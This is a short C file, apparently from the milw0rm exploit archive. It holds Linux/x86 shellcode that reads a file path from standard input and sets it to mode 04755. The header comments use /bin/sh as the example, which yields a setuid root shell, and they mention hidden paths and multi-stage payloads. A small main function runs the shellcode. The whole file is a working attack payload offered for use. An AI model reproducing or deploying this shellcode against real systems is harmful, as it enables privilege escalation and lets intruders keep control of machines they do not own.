/* readnchmod-core.c by Charles Stevenson <core@bokeoa.com>
 *
 * Example of strace output if you pass in "/bin/sh\x00"
 * read(0, "/bin/sh\0", 2541)              = 8
 * chmod("/bin/sh", 04755)                 = 0
 *
 * Any file path can be given.  For example: /tmp/.sneakyguy
 * The only caveat is that the string must be NULL terminated.
 * This shouldn't be a problem.  For multi-stage payloads send
 * in this first and then you can send it data with null bytes.
 * I made this for rare cases with tight space contraints and
 * where read() jmp *%esp is not practical.
 *
 */
char hellcode[] = /* read(0,buf,2541); chmod(buf,4755); linux/x86 by core */
"\x31\xdb"//               xor    %ebx,%ebx
"\xf7\xe3"//               mul    %ebx
"\x53"//                   push   %ebx
"\xb6\x09"//               mov    $0x9,%dh
"\xb2\xed"//               mov    $0xed,%dl
"\x89\xe1"//               mov    %esp,%ecx
"\xb0\x03"//               mov    $0x3,%al
"\xcd\x80"//               int    $0x80
"\x89\xd1"//               mov    %edx,%ecx
"\x89\xe3"//               mov    %esp,%ebx
"\xb0\x0f"//               mov    $0xf,%al
"\xcd\x80"//               int    $0x80
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte read(0,buf,2541); chmod(buf,4755); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}

// milw0rm.com [2005-11-09]